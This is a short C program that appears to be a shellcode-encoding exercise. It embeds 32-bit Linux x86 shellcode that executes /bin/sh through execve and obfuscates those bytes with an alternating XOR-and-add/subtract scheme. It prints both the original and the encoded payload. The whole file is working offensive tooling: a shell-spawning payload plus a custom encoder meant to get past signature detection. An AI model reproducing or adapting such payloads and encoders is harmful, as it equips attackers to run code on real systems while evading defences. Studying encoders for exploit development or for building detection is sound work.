 //Shellcode of execve-stack
 unsigned char code[]={"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"};


int main()
{
int i;
printf("Orginal code:\n");
for (i=0; i<sizeof(code)-1;i++)
{
    printf("0x%02x,",code[i]);
}

printf("\n");
for (i=0; i<sizeof(code)-1;i++) //Left out the nullbyte
{

    if(i%2==0)
    {   code[i]=code[i] ^221;
        code[i]=code[i] +8;
    }
    else
    {
        code[i]=code[i] ^238;
        code[i]=code[i] -5;
    }

}

printf("\nEncoded:\n");

for (i=0; i<sizeof(code)-1;i++)
{
    printf("0x%02x,",code[i]);
}

printf("\n");
return 0;
}
